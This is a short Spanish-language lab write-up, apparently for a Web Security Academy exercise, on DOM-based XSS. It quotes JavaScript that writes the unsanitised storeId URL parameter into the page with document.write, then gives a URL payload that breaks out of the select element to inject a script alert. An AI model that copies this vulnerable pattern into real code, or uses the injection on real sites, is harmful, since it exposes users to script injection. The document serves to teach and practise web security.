Este tipo de ataque se basa en identificar elementos no sanitizados que nos permitan modificar la estructura del dom mediante parámetros introducidos a través de un input

Ej
Aqui tenemos el codigo java script que se ejecuta cuando hacemos un check del stock y vemos que la variable store toma su valor atendiendo al valor que tenga el parámetro  storeId esto lo podemos aprovechar para enviar código malicioso al sitio ya que lo que se hace es introducir este valor  una de los elementos options del select por lo que inentaremos modificar la entrada para que modifique el DOM a nuestro favor.
```
<script>
	var stores = ["London","Paris","Milan"];
	var store = (new URLSearchParams(window.location.search)).get('storeId');
	document.write('<select name="storeId">');
	if(store) {
		document.write('<option selected>'+store+'</option>');
	}
	for(var i=0;i<stores.length;i++) {
		if(stores[i] === store) {
			continue;
		}
		document.write('<option>'+stores[i]+'</option>');
	}
	document.write('</select>');
</script>
```

Lo que haremos es pasar por parámetro GET una cadena que modifique el DOM con nuestro codigo y que lo interprete correctamente el navegador esto 

```
https://0a30004e0307540980a30d48001400e2.web-security-academy.net/productId=2&storeId=</option>+</select>+<script>alert(0)</script>
```
